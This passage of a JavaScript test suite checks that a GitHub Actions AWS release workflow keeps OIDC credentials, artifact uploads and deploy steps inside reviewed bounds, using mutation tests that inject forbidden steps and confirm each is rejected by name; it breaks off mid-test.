    // deploy-release.js must be Environment-bound, must descend from ITS environment's preflight,
    // and must hold the OIDC pair — id-token: write plus the pinned credentials consumer. Each
    // absence is named, so the reviewed-object diff is never the only thing standing.
    const invokesEntrypoint = (job?.steps ?? []).some(
      (st) => typeof st.run === 'string' && st.run.includes('deploy-release.js'),
    );
    if (invokesEntrypoint) {
      if (!job.environment) errors.push(`job "${name}" runs the deploy entrypoint but binds no Environment`);
      else if (name !== 'global-preflight' && !ancestorsOf(name).has(`${job.environment}-preflight`)) {
        errors.push(`job "${name}" runs the deploy entrypoint without descending from the ${job.environment} preflight`);
      }
      if (job?.permissions?.['id-token'] !== 'write') {
        errors.push(`job "${name}" runs the deploy entrypoint without id-token: write`);
      }
      const consumer = (job.steps ?? []).find(
        (s3) => s3.uses === 'aws-actions/configure-aws-credentials@e6de054238d6b7531b4efff3b6587d9aade6a06c',
      );
      if (!consumer) errors.push(`job "${name}" runs the deploy entrypoint without the pinned credentials consumer`);
      // The deploy authority is the CANONICAL Environment-scoped secret (design §3) — a differently
      // named secret is an unreviewed authority, whatever role it happens to hold.
      else if (consumer.with?.['role-to-assume'] !== '${{ secrets.AWS_DEPLOY_ROLE_ARN }}') {
        errors.push(`job "${name}" must assume the canonical Environment-scoped deploy role secret AWS_DEPLOY_ROLE_ARN`);
      }
      // Zamp's cloud gate must REACH the entrypoint: without CBA_CLOUD_GATE in the step
      // environment, the entrypoint refuses every run and the lane cannot deploy at all — but the
      // absence would read as an environment problem, not as the missing authorization it is.
      const entryStep = (job.steps ?? []).find((st) => typeof st.run === 'string' && st.run.includes('deploy-release.js'));
      if (entryStep?.env?.CBA_CLOUD_GATE !== '${{ vars.CBA_CLOUD_GATE }}') {
        errors.push(`job "${name}" runs the deploy entrypoint without Zamp's cloud gate (CBA_CLOUD_GATE) in the step environment`);
      }
    }
    // CREDENTIALS AND PROJECT CODE NEVER SHARE A WINDOW (Slice B1 round 3; re-narrowed in
    // I3-2). `id-token: write` is JOB-scoped: scrubbing AWS_* variables cannot remove the
    // ability to mint a fresh OIDC token, so NO action step may ever follow the consumer in this
    // job — evidence leaves as job OUTPUTS and is uploaded by dev-evidence, which never holds
    // id-token. After the pinned consumer, the ONLY steps are the reviewed entrypoint and the
    // evidence reader, both run steps whose full content the reviewed object pins.
    const consumerIdx = (job?.steps ?? []).findIndex(
      (st) => st.uses === 'aws-actions/configure-aws-credentials@e6de054238d6b7531b4efff3b6587d9aade6a06c',
    );
    if (consumerIdx >= 0) {
      const allowedAfterConsumer = [
        'Evaluate PREFLIGHT-1 and PREFLIGHT-2', // the preflight evaluator, under the read-only role
        'Deploy the verified release through the sanctioned entrypoint',
        'Publish the evidence record as job outputs',
      ];
      for (const st of job.steps.slice(consumerIdx + 1)) {
        if (st.uses !== undefined) {
          errors.push(`job "${name}" runs an action step after credential acquisition — only the reviewed entrypoints may execute with credentials`);
        }
        if (typeof st.run === 'string' && /\bnpm\b|\bnpx\b/.test(st.run)) {
          errors.push(`job "${name}" runs project or package-manager code after credential acquisition and before the gate — synth and installs must complete before the OIDC consumer`);
        }
        if (!allowedAfterConsumer.includes(st.name)) {
          errors.push(`job "${name}" runs a step outside the closed post-consumer set: ${st.name ?? st.uses}`);
        }
      }
    }
    // ARTIFACTS NEVER LEAVE A CREDENTIALED JOB (I3-2): any job holding id-token: write may mint
    // tokens for its entire duration, so uploaders live only in jobs that never held it.
    if (job?.permissions?.['id-token'] === 'write') {
      for (const st of job?.steps ?? []) {
        if (String(st.uses ?? '').startsWith('actions/upload-artifact@')) {
          errors.push(`job "${name}" uploads an artifact while holding id-token: write — evidence leaves only from a job with no OIDC capability`);
        }
      }
    }
    // OIDC authority is a capability, not a default (#70 round 8). When id-token: write exists,
    // EVERY action, command and dependency lifecycle script in the job can mint an
    // Environment-bound token — so the permission is allowed only where a reviewed OIDC consumer
    // is present: today, exactly the pinned configure-aws-credentials action. A placeholder that
    // verifies a manifest needs none of that.
    if (job?.permissions?.['id-token'] === 'write') {
      const consumesOidc = (job.steps ?? []).some(
        (s2) => s2.uses === 'aws-actions/configure-aws-credentials@e6de054238d6b7531b4efff3b6587d9aade6a06c',
      );
      if (!consumesOidc) {
        errors.push(`job "${name}" holds id-token: write with no reviewed OIDC consumer`);
      }
    }
    if (name === 'global-preflight') {
      if (job && Object.hasOwn(job, 'environment')) errors.push('global-preflight must not bind an Environment');
      continue;
    }
    if (typeof job?.if !== 'string' || !IF_GRAMMAR.test(job.if)) {
      errors.push(`job "${name}" has a success condition outside the closed grammar`);
    }
    if (!ancestorsOf(name).has('global-preflight')) errors.push(`job "${name}" does not descend from global-preflight`);
    if (job?.environment === 'pilot' && name !== 'pilot-preflight') {
      const a = ancestorsOf(name);
      if (!a.has('pilot-preflight')) errors.push(`pilot-bound job "${name}" does not descend from the pilot preflight`);
      if (!a.has('dev-stage')) errors.push(`pilot-bound job "${name}" does not descend from the green dev stage`);
    }
  }
  const pp = jobs['pilot-preflight'];
  if (!pp || ![].concat(pp.needs ?? []).includes('dev-stage')) {
    errors.push('pilot-preflight does not directly depend on the dev stage');
  }
  if (pp && !/inputs\.mode == 'dev_then_pilot'/.test(pp.if ?? '')) {
    errors.push('pilot-preflight is reachable without the operator asking for promotion');
  }

  return errors;
}

/* ================= the real file ================================================================ */

test('the release lane parses cleanly and EQUALS the reviewed object', () => {
  assert.deepEqual(releaseLaneErrors(raw), []);
});

test('YAML sees exactly the seven reviewed jobs — the round-7 lesson, asserted at the source', () => {
  const { wf } = parseWorkflow(raw);
  assert.deepEqual(Object.keys(wf.jobs), ['global-preflight', 'dev-preflight', 'bind-stage', 'dev-stage', 'dev-evidence', 'pilot-preflight', 'pilot-stage']);
  assert.deepEqual(Object.keys(wf), ['name', 'run-name', 'on', 'permissions', 'concurrency', 'jobs']);
});

test('SLICE I4: the binding carries the manifest digest an authorization must name', () => {
  const { wf } = parseWorkflow(raw);
  // dev-preflight computes the §6b bundle digest with the SAME pinned envelope the entrypoint
  // recomputes at the gate — one implementation pair, drift caught by test/digest-agreement.
  const evalStep = wf.jobs['dev-preflight'].steps.find((st) => typeof st.run === 'string' && st.run.includes('manifestBundleDigest'));
  assert.ok(evalStep, 'the preflight evaluator computes manifest_digest');
  assert.equal(wf.jobs['dev-preflight'].outputs.manifest_digest, '${{ steps.preflight.outputs.manifest_digest }}');
  // …and the binding artifact embeds it, refusing to exist without a well-formed digest: the
  // binding is the digest's birthplace (SPEC-RUN-006), so an empty one is a failed bind.
  const bind = wf.jobs['bind-stage'].steps.find((st) => typeof st.run === 'string' && st.run.includes('binding.json'));
  assert.equal(bind.env.MANIFEST_DIGEST, '${{ needs.dev-preflight.outputs.manifest_digest }}');
  assert.ok(bind.run.includes('manifestDigest: process.env.MANIFEST_DIGEST'));
  assert.ok(bind.run.includes('[0-9a-f]{64}'));
});

test('SLICE I2: the bind stage terminates the DAG with no cloud authority and a pinned artifact', () => {
  const { wf } = parseWorkflow(raw);
  const bind = wf.jobs['bind-stage'];
  // Gated on the IMMUTABLE dispatch input: an Environment value changed mid-run changes nothing.
  assert.equal(bind.if, "needs.dev-preflight.result == 'success' && inputs.mode == 'bind_only'");
  // No id-token, no Environment binding, no OIDC consumer: this job cannot acquire AWS authority.
  assert.deepEqual(bind.permissions, { contents: 'read' });
  assert.equal(bind.environment, undefined);
  assert.ok(bind.steps.every((step) => !String(step.uses ?? '').includes('aws-actions/')));
  // Terminal in the DAG: no job needs bind-stage, so nothing can run downstream of a binding.
  for (const [name, job] of Object.entries(wf.jobs)) {
    assert.ok(!(job.needs ?? []).includes('bind-stage'), `${name} must not depend on bind-stage`);
  }
  // The artifact uploader is pinned by SHA and uploads exactly the named binding file.
  const upload = bind.steps.find((step) => String(step.uses ?? '').startsWith('actions/upload-artifact@'));
  assert.equal(upload.uses, 'actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a');
  // The version comment lives in the raw text, beside the pin, like every other action here.
  assert.ok(raw.includes('actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1'));
  assert.equal(upload.with.name, 'binding');
  assert.equal(upload.with['if-no-files-found'], 'error');
  // …and dev-stage is reachable ONLY on the effect modes; a bind run can neither plan nor
  // delete. The ENTRYPOINT then enforces name/effect coherence via DISPATCH_MODE.
  assert.equal(wf.jobs['dev-stage'].if, "needs.dev-preflight.result == 'success' && (inputs.mode == 'dev_only' || inputs.mode == 'abandon')");
});

test('SLICE I3-2: evidence leaves the lane ONLY from a job that never held OIDC capability', () => {
  const { wf } = parseWorkflow(raw);
  // dev-stage: no uploader, no scrub theater — after the consumer, only the entrypoint and the
  // evidence reader, and the record leaves as job OUTPUTS.
  const stage = wf.jobs['dev-stage'];
  assert.ok(stage.steps.every((st) => !String(st.uses ?? '').startsWith('actions/upload-artifact@')));
  assert.deepEqual(Object.keys(stage.outputs), ['evidence', 'mode']);
  const entry = stage.steps.find((st) => typeof st.run === 'string' && st.run.includes('deploy-release.js'));
  assert.equal(entry.env.CORRELATION_ID, '${{ inputs.correlation_id }}');
  assert.ok(entry.run.includes('--artifact-out "$RUNNER_TEMP/release-evidence/evidence.json"'));
  // dev-evidence: the boundary the scrub could not be — no id-token, no Environment, no AWS
  // consumer; it can NEVER mint a token, so uploader failure modes leak nothing.
  const evidence = wf.jobs['dev-evidence'];
  assert.deepEqual(evidence.permissions, { contents: 'read' });
  assert.equal(evidence.environment, undefined);
  assert.ok(evidence.steps.every((st) => !String(st.uses ?? '').includes('aws-actions/')));
  assert.deepEqual(evidence.needs, ['dev-stage']);
  // It runs on refusals too — but never on a skip or a cancel.
  assert.equal(evidence.if, "always() && needs.dev-stage.result != 'skipped' && needs.dev-stage.result != 'cancelled'");
  // The three uploaders are pinned and carry the reviewed artifact names, keyed on the mode.
  const uploads = evidence.steps.filter((st) => String(st.uses ?? '').startsWith('actions/upload-artifact@'));
  assert.deepEqual(uploads.map((st) => st.with.name), ['plan', 'deploy', 'abandon', 'evidence']);
  for (const st of uploads) assert.equal(st.uses, 'actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a');
  assert.deepEqual(uploads.map((st) => st.with['if-no-files-found']), ['error', 'error', 'error', 'ignore']);
  // ROUND I4-2: EXACTLY ONE uploader matches every mode the record can carry — refusals route by
  // EXCLUSION, so an abandon-mode refusal publishes its evidence instead of vanishing. The three
  // pinned conditions are evaluated against the full mode table.
  const conditions = uploads.map((st) => st.if);
  assert.deepEqual(conditions, [
    "\${{ needs.dev-stage.outputs.mode == 'plan_only' }}",
    "\${{ needs.dev-stage.outputs.mode == 'deploy' }}",
    "\${{ needs.dev-stage.outputs.mode == 'abandon' }}",
    "\${{ needs.dev-stage.outputs.mode != 'plan_only' && needs.dev-stage.outputs.mode != 'deploy' && needs.dev-stage.outputs.mode != 'abandon' }}",
  ]);
  const selects = (mode) => [
    mode === 'plan_only',
    mode === 'deploy',
    mode === 'abandon',
    mode !== 'plan_only' && mode !== 'deploy' && mode !== 'abandon',
  ];
  for (const mode of ['plan_only', 'deploy', 'abandon', '']) {
    const hits = selects(mode).filter(Boolean).length;
    assert.equal(hits, 1, `mode ${JSON.stringify(mode)} must select exactly one uploader`);
  }
  // No job downstream of dev-evidence: it is DAG-terminal like bind-stage.
  for (const [name, job] of Object.entries(wf.jobs)) {
    assert.ok(!(job.needs ?? []).includes('dev-evidence'), `${name} must not depend on dev-evidence`);
  }
});

test('SLICE I3-3: transport loss is a red run, and the record must arrive intact', () => {
  const { wf } = parseWorkflow(raw);
  const materialize = wf.jobs['dev-evidence'].steps[0];
  // A mode with no evidence = the channel dropped or suppressed the value after a possible
  // effect: the job FAILS loudly instead of uploading nothing.
  assert.ok(materialize.run.includes('the evidence output vanished in transport'));
  assert.ok(materialize.run.includes('exit 1'));
  // The record is validated on arrival: schema and THIS dispatch's correlation id.
  assert.ok(materialize.run.includes('cba-release-evidence/1'));
  assert.ok(materialize.run.includes('evidence correlation does not match this dispatch'));
  assert.equal(materialize.env.CORRELATION_ID, '${{ inputs.correlation_id }}');
});

test('SLICE I3-3 MUTATION PROOF: removing the vanish guard is refused', () => {
  const noGuard = raw.replace(
    `          if [ -n "$MODE" ] && [ -z "$EVIDENCE" ]; then
            echo "::error::the evidence output vanished in transport (mode=$MODE, evidence empty) — the record exists in dev-stage but did not arrive; do not trust this run's artifacts"
            exit 1
          fi
`,
    '',
  );
  assert.notEqual(noGuard, raw, 'mutation did not apply: vanish guard');
  const { wf } = parseWorkflow(noGuard);
  assert.ok(!wf.jobs['dev-evidence'].steps[0].run.includes('vanished in transport'));
  // The reviewed-object diff refuses it; the semantic assertion above names it.
  assert.notDeepEqual(wf, EXPECTED_WORKFLOW);
});

test('EXECUTED (I3-4): the materializer, run for real near the byte cap, reproduces the record byte for byte', () => {
  // Round I3-4: the previous assertions inspected YAML text; this one RUNS the script. The
  // record is sized near the largest the entrypoint accepts (EVIDENCE_MAX_BYTES = 100_000), so
  // the whole chain — env injection, vanish guard, arrival validation, file write — is proven at
  // the size that matters, on the same process-limit regime the runner uses.
  const { wf } = parseWorkflow(raw);
  const script = wf.jobs['dev-evidence'].steps[0].run;
  const correlation = `cba-70-${'0'.repeat(32)}`;
  const record = {
    schema: 'cba-release-evidence/1',
    correlationId: correlation,
    releaseSha: 'a'.repeat(40),
    environment: 'dev',
    mode: 'plan_only',
    decisionId: 'zamp-i3-4-proof',
    stacks: ['IdentityStack'],
    planDigest: 'b'.repeat(64),
    changeSets: [{ stackName: 'CbaStudyCoach-dev-Identity', changeSetName: `cba-70-${'a'.repeat(12)}`, status: 'CREATE_COMPLETE' }],
    executed: [],
    outcome: 'PLAN_PREPARED',
    refusals: [],
    rendering: 'r'.repeat(98_000),
  };
  const evidence = JSON.stringify(record, null, 2);
  assert.ok(Buffer.byteLength(evidence, 'utf8') > 90_000 && Buffer.byteLength(evidence, 'utf8') <= 100_000, `sized near the cap: ${Buffer.byteLength(evidence, 'utf8')}`);
  const dir = fs.mkdtempSync(join(os.tmpdir(), 'cba-materialize-'));
  try {
    const res = spawnSync('bash', ['-c', script], {
      encoding: 'utf8',
      env: { PATH: process.env.PATH, RUNNER_TEMP: dir, EVIDENCE: evidence, MODE: 'plan_only', CORRELATION_ID: correlation },
    });
    assert.equal(res.status, 0, `${res.stdout}\n${res.stderr}`);
    const produced = fs.readFileSync(join(dir, 'evidence', 'plan.json'));
    assert.ok(produced.equals(Buffer.from(`${evidence}\n`, 'utf8')), 'the produced file IS the record, byte for byte');
    // The arrival validation bites: a correlation that is not this dispatch's fails the job.
    const wrong = spawnSync('bash', ['-c', script], {
      encoding: 'utf8',
      env: { PATH: process.env.PATH, RUNNER_TEMP: dir, EVIDENCE: evidence, MODE: 'plan_only', CORRELATION_ID: `cba-70-${'f'.repeat(32)}` },
    });
    assert.notEqual(wrong.status, 0, 'a foreign correlation must fail the materializer');
    // ROUND I4-2: an ABANDON-mode refusal record materializes as evidence.json — executed for
    // real, byte for byte — so the by-exclusion uploader has a file to publish.
    const abandonRecord = { ...record, mode: 'abandon', outcome: 'REFUSED', refusals: ['ABANDON_NOT_IMPLEMENTED'], rendering: null };
    const abandonJson = JSON.stringify(abandonRecord, null, 2);
    const abandonRun = spawnSync('bash', ['-c', script], {
      encoding: 'utf8',
      env: { PATH: process.env.PATH, RUNNER_TEMP: dir, EVIDENCE: abandonJson, MODE: 'abandon', CORRELATION_ID: correlation },
    });
    assert.equal(abandonRun.status, 0, `${abandonRun.stdout}\n${abandonRun.stderr}`);
    // SLICE I5: abandon has its OWN reviewed name — the runbook digests abandon.json.
    const abandonFile = fs.readFileSync(join(dir, 'evidence', 'abandon.json'));
    assert.ok(abandonFile.equals(Buffer.from(`${abandonJson}\n`, 'utf8')), 'the abandon record is materialized under its reviewed name');

    // …and the vanish guard bites: a mode with no evidence is a RED run, executed for real.
    const vanished = spawnSync('bash', ['-c', script], {
      encoding: 'utf8',
      env: { PATH: process.env.PATH, RUNNER_TEMP: dir, EVIDENCE: '', MODE: 'plan_only', CORRELATION_ID: correlation },
    });
    assert.notEqual(vanished.status, 0, 'mode without evidence must fail loudly');
    assert.match(`${vanished.stdout}${vanished.stderr}`, /vanished in transport/);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('EXECUTED (I3-4): the size the OLD cap accepted cannot even start the shell — the byte cap exists for a reason', () => {
  // Codex's reproduction: a single Linux envp entry is bounded by MAX_ARG_STRLEN (128 KiB); a
  // ~400 KB record — legal under the retired 450k-UNIT cap — dies with E2BIG before any guard.
  const res = spawnSync('bash', ['-c', 'true'], {
    encoding: 'utf8',
    env: { PATH: process.env.PATH, EVIDENCE: 'x'.repeat(400_000) },
  });
  assert.notEqual(res.status, 0, 'the oversized env entry must prevent the process from starting');
  assert.match(String(res.error?.code ?? res.error ?? ''), /E2BIG/);
});

test('SLICE I3-2: the file names the workflow produces are the names the runbooks digest', () => {
  // ROUND I3-2 (Codex): the plan runbook digests plan.json and the deploy runbook deploy.json —
  // the workflow must materialize exactly those basenames, keyed on the evidence mode.
  const { wf } = parseWorkflow(raw);
  const materialize = wf.jobs['dev-evidence'].steps.find((st) => typeof st.run === 'string' && st.run.includes('Materialize') === false && st.run.includes('plan.json'));
  assert.ok(materialize.run.includes('plan_only) name=plan.json'));
  assert.ok(materialize.run.includes('deploy) name=deploy.json'));
  assert.ok(materialize.run.includes('abandon) name=abandon.json'));
  const planRunbook = fs.readFileSync(join(here, '..', 'docs', 'runbooks', 'aws-dev-release-plan.md'), 'utf8');
  const deployRunbook = fs.readFileSync(join(here, '..', 'docs', 'runbooks', 'aws-dev-release-deploy.md'), 'utf8');
  const abandonRunbook = fs.readFileSync(join(here, '..', 'docs', 'runbooks', 'aws-dev-release-abandon.md'), 'utf8');
  assert.ok(planRunbook.includes('/plan.json'), 'the plan runbook digests plan.json');
  assert.ok(deployRunbook.includes('/deploy.json'), 'the deploy runbook digests deploy.json');
  assert.ok(abandonRunbook.includes('/abandon.json'), 'the abandon runbook digests abandon.json');
  assert.ok(!planRunbook.includes('evidence.json'), 'the plan runbook must not reference a name the workflow reserves for refusals');
});

test('SLICE I3-2 MUTATION PROOFS: authority and evidence cannot re-merge', () => {
  // An uploader re-added to dev-stage (which holds id-token) trips BOTH named rules.
  const uploaderInStage = raw.replace(
    '      # ROUND I3-2: no post-effect ACTION runs in this job, ever.',
    `      - name: Upload early (attack)
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: early
          path: \${{ runner.temp }}/release-evidence/evidence.json
      # ROUND I3-2: no post-effect ACTION runs in this job, ever.`,
  );
  assert.notEqual(uploaderInStage, raw);
  const errs = releaseLaneErrors(uploaderInStage);
  assert.ok(errs.some((e) => e.includes('runs an action step after credential acquisition')));
  assert.ok(errs.some((e) => e.includes('uploads an artifact while holding id-token')));
  // A foreign run step after the consumer is outside the closed post-consumer set.
  const foreignAfterConsumer = raw.replace(
    '      # ROUND I3-2: no post-effect ACTION runs in this job, ever.',
    `      - name: Innocuous cleanup
        run: echo done
      # ROUND I3-2: no post-effect ACTION runs in this job, ever.`,
  );
  assert.notEqual(foreignAfterConsumer, raw);
  assert.ok(
    releaseLaneErrors(foreignAfterConsumer).some((e) => e.includes('outside the closed post-consumer set')),
    'any unreviewed step name after the consumer must be refused',
  );
  // dev-evidence acquiring id-token trips the uploader rule.
  const evidenceWithToken = raw.replace(
    `  dev-evidence:
    name: Dev evidence — upload the run's record (no cloud authority)
    needs: [dev-stage]
    if: always() && needs.dev-stage.result != 'skipped' && needs.dev-stage.result != 'cancelled'
    runs-on: ubuntu-latest
    timeout-minutes: 5
    permissions:
      contents: read`,
    `  dev-evidence:
    name: Dev evidence — upload the run's record (no cloud authority)
    needs: [dev-stage]
    if: always() && needs.dev-stage.result != 'skipped' && needs.dev-stage.result != 'cancelled'
    runs-on: ubuntu-latest
    timeout-minutes: 5
    permissions:
      contents: read
      id-token: write`,
  );
  assert.notEqual(evidenceWithToken, raw);
  assert.ok(
    releaseLaneErrors(evidenceWithToken).some((e) => e.includes('uploads an artifact while holding id-token') || e.includes('id-token')),
    'dev-evidence with id-token must be refused',
  );
});

test('SLICE I2 MUTATION PROOFS: the bind path cannot quietly gain authority or lose its gate', () => {
  // dev-stage losing its mode gate would let a bind_only dispatch deploy.
  rejects(raw.replace("if: needs.dev-preflight.result == 'success' && (inputs.mode == 'dev_only' || inputs.mode == 'abandon')", "if: needs.dev-preflight.result == 'success'"),
    'dev-stage without the mode gate must fail the reviewed-object diff');
  // bind-stage acquiring id-token would fail: permissions are part of the reviewed object, and
  // the OIDC rule counts consumers per job.
  rejects(raw.replace('  bind-stage:\n    name: Bind — publish the release manifest as evidence (no cloud authority)\n    needs: [global-preflight, dev-preflight]\n    if: needs.dev-preflight.result == \'success\' && inputs.mode == \'bind_only\'\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n    permissions:\n      contents: read',
    '  bind-stage:\n    name: Bind — publish the release manifest as evidence (no cloud authority)\n    needs: [global-preflight, dev-preflight]\n    if: needs.dev-preflight.result == \'success\' && inputs.mode == \'bind_only\'\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n    permissions:\n      contents: read\n      id-token: write'),
    'bind-stage with id-token must fail the reviewed-object diff');
  // The run name is the resolver's contract: any deviation fails by name.
  rejects(raw.replace('run-name: cba-release ${{ inputs.mode }} ${{ inputs.correlation_id }}', 'run-name: release ${{ inputs.correlation_id }}'),
    'a foreign run name must be refused');
  // The correlation input cannot become optional.
  rejects(raw.replace("      correlation_id:\n        description: 'Caller-generated id for THIS decision, cba-70- plus 32 lowercase hex (a CSPRNG value, per the runbook standard); it becomes part of the run name and of every uploaded artifact'\n        required: true", "      correlation_id:\n        description: 'Caller-generated id for THIS decision, cba-70- plus 32 lowercase hex (a CSPRNG value, per the runbook standard); it becomes part of the run name and of every uploaded artifact'\n        required: false"),
    'an optional correlation id must be refused');
});

test('Slice B1 deploys dev and ONLY dev: the entrypoint lives in dev-stage alone, raw deploys nowhere', () => {
  const { wf } = parseWorkflow(raw);
  const invokers = [];
  for (const [name, job] of Object.entries(wf.jobs)) {
    for (const step of job.steps ?? []) {
      if (typeof step.run !== 'string') continue;
      assert.equal(DEPLOY_COMMAND.test(step.run), false, `${name} must never run a raw deploy command`);
      if (step.run.includes('deploy-release.js')) invokers.push(name);
    }
  }
  assert.deepEqual(invokers, ['dev-stage'], 'exactly one job may deploy, and it is the dev stage');
  // And the pilot side still deploys nothing at all — the placeholder survives until promotion.
  for (const step of wf.jobs['pilot-stage'].steps ?? []) {
    assert.equal(typeof step.run === 'string' && step.run.includes('deploy-release.js'), false);
  }
});

test('POSITIVE CONTROL: promotion cannot be unblocked by name, and the entrypoint obligations bite', () => {
  // Restoring dev_then_pilot must be refused BY THE PROMOTION RULE, not merely by the object diff —
  // the promotion slice will legitimately edit the reviewed object, and this named rule is what
  // forces that edit to also bring O1/O2, the smokes and the SNS/KMS proof through review.
  const unblocked = raw.replace(
    '        options:\n          - bind_only\n          - dev_only',
    '        options:\n          - bind_only\n          - dev_only\n          - dev_then_pilot',
  );
  assert.notEqual(unblocked, raw);
  assert.ok(
    releaseLaneErrors(unblocked).some((e) => e.includes('promotion is mechanically blocked')),
    'restoring the promotion option must trip the named rule',
  );

  // The entrypoint job stripped of its credentials consumer: both named rules must fire — OIDC
  // authority without a consumer, and the entrypoint without its consumer.
  const noConsumer = raw.replace(
    `      - name: Configure AWS credentials (dev deploy role)
        uses: aws-actions/configure-aws-credentials@e6de054238d6b7531b4efff3b6587d9aade6a06c # v6
        with:
          role-to-assume: \${{ secrets.AWS_DEPLOY_ROLE_ARN }}
          aws-region: \${{ vars.AWS_REGION }}
          mask-aws-account-id: true
`,
    '',
  );
  assert.notEqual(noConsumer, raw, 'mutation did not apply: consumer removal');
  const errs = releaseLaneErrors(noConsumer);
  assert.ok(errs.some((e) => e.includes('id-token: write with no reviewed OIDC consumer')));
  assert.ok(errs.some((e) => e.includes('without the pinned credentials consumer')));

  // The entrypoint without id-token: write.
  const noToken = raw.replace(
    '    timeout-minutes: 15\n    environment: dev\n    permissions:\n      contents: read\n      id-token: write\n    outputs:',
    '    timeout-minutes: 15\n    environment: dev\n    permissions:\n      contents: read\n    outputs:',
  );
  assert.notEqual(noToken, raw, 'mutation did not apply: id-token removal');
  assert.ok(releaseLaneErrors(noToken).some((e) => e.includes('runs the deploy entrypoint without id-token: write')));

  // The deploy role swapped for an admin-shaped secret dies BY NAME: the canonical-secret rule
  // (Slice B1 review) refuses any authority that is not AWS_DEPLOY_ROLE_ARN — whatever the
  // swapped-in secret happens to hold.
  const adminRole = raw.replace('secrets.AWS_DEPLOY_ROLE_ARN', 'secrets.AWS_ADMIN_ROLE_ARN');
  assert.notEqual(adminRole, raw);
  assert.ok(releaseLaneErrors(adminRole).some((e) => e.includes('canonical Environment-scoped deploy role secret AWS_DEPLOY_ROLE_ARN')));
});

test('POSITIVE CONTROL: project code cannot re-enter the credential window', () => {
  // The exact round-3 shape: synth (project code) executing AFTER the OIDC consumer. Re-adding an
  // npm invocation to the credentialed deploy step must trip the window rule by name.
  const synthAfterCreds = raw.replace(
    '          set -euo pipefail\n          printf \'%s\' "$MANIFEST_JSON" > "$RUNNER_TEMP/manifest.json"\n',
    '          set -euo pipefail\n          printf \'%s\' "$MANIFEST_JSON" > "$RUNNER_TEMP/manifest.json"\n          npm run synth:quiet -- -c environment=dev\n',
  );
  assert.notEqual(synthAfterCreds, raw, 'mutation did not apply: synth after credentials');
  assert.ok(
    releaseLaneErrors(synthAfterCreds).some((e) => e.includes('after credential acquisition and before the gate')),
    'project code after the consumer must trip the credential-window rule by name',
  );

  // An ACTION step after the consumer is the same hole with a different face — any action can
  // exfiltrate or spend the credentials before the entrypoint's gate check.
  const actionAfterCreds = raw.replace(
    '      - name: Deploy the verified release through the sanctioned entrypoint\n',
    '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n        with:\n          persist-credentials: false\n      - name: Deploy the verified release through the sanctioned entrypoint\n',
  );
  assert.notEqual(actionAfterCreds, raw, 'mutation did not apply: action after credentials');
  assert.ok(
    releaseLaneErrors(actionAfterCreds).some((e) => e.includes('runs an action step after credential acquisition')),
    'an action step after the consumer must trip the credential-window rule by name',
  );
});

test('POSITIVE CONTROL: serialization, time bounds and the cloud gate cannot be loosened', () => {
  // The exact finding: a concurrency group derived from the release SHA gives two different SHAs
  // two different groups — refused by the named serialization rule, not merely the object diff.
  const shaKeyed = raw.replace(
    'concurrency:\n  group: release-dev\n  cancel-in-progress: false',
    'concurrency:\n  group: release-dev-${{ inputs.release_sha }}\n  cancel-in-progress: false',
  );
  assert.notEqual(shaKeyed, raw, 'mutation did not apply: concurrency rekey');
  assert.ok(
    releaseLaneErrors(shaKeyed).some((e) => e.includes('releases must serialize per environment')),
    'a SHA-keyed group must trip the serialization rule by name',
  );
  // Cancelling a live release is the same rule: the lock is the whole literal, both keys.
  const cancelling = raw.replace(
    'concurrency:\n  group: release-dev\n  cancel-in-progress: false',
    'concurrency:\n  group: release-dev\n  cancel-in-progress: true',
  );
  assert.notEqual(cancelling, raw);
  assert.ok(releaseLaneErrors(cancelling).some((e) => e.includes('releases must serialize per environment')));

  // A job with its time bound removed retains OIDC authority until GitHub's default limit — every
  // job must trip the named rule when its timeout-minutes disappears.
  for (const minutes of ['    timeout-minutes: 15\n', '    timeout-minutes: 5\n']) {
    assert.ok(raw.includes(minutes), 'anchor must exist');
    const unbounded = raw.replace(minutes, '');
    assert.notEqual(unbounded, raw, 'mutation did not apply: timeout removal');
    assert.ok(
      releaseLaneErrors(unbounded).some((e) => e.includes('must be bounded to exactly')),
      'an unbounded job must trip the time-bound rule by name',
    );
  }

  // The entrypoint with Zamp's cloud gate stripped from the step environment: the entrypoint
  // would refuse every run, but the LANE must refuse first, by name, as a missing authorization.
  const noGate = raw.replace('          CBA_CLOUD_GATE: ${{ vars.CBA_CLOUD_GATE }}\n', '');
  assert.notEqual(noGate, raw, 'mutation did not apply: gate removal');
  assert.ok(
    releaseLaneErrors(noGate).some((e) => e.includes("without Zamp's cloud gate")),
    'a gate-less entrypoint step must trip the cloud-gate rule by name',
  );
});

test('the deployment-binding disclosure matches the evidenced state, and the limit stays stated', () => {
  // Comments are the one thing YAML cannot see; the disclosures live there, so this reads raw text.
  // From 2026-07-31 to 2026-08-02 this test pinned the UNGATED disclosure; the Environments now
  // exist with reviewed evidence, and the header must say the current truth — including that a
  // settings change invalidates the evidence.
  assert.match(raw, /THE HUMAN DEPLOYMENT BINDING IS REAL AS OF 2026-08-02/);
  assert.match(raw, /deployment-branch policy whose only entry is `main`/);
  assert.match(raw, /`pilot` additionally requires the\n# designated reviewer/);
  assert.match(raw, /invalidates the evidence and must be re-evidenced/);
  assert.match(raw, /executes the workflow\n# DEFINITION from the branch the operator selects/);
});

/* ================= mutations ==================================================================== */

const rejects = (mutated, why) => {
  assert.notEqual(mutated, raw, `mutation did not apply: ${why}`);
  assert.notDeepEqual(releaseLaneErrors(mutated), [], `must be rejected: ${why}`);
};

/** The round-7 payloads must be PROVEN ACTIVE under YAML before their rejection means anything. */
const activeAt = (mutated, probe) => {
  const { wf, errors } = parseWorkflow(mutated);
  if (errors) return { parseRefused: true };
  return { value: probe(wf) };
};

test('POSITIVE CONTROL: every reproduction from the round-7 review is rejected by name', () => {
  // (a) A QUOTED env key on a reviewed step. Invisible to the old regex; real to YAML.
  const quotedEnv = raw.replace(
    '          CBA_EXPECTED_USER_POOL_ID: ${{ secrets.CBA_EXPECTED_USER_POOL_ID }}',
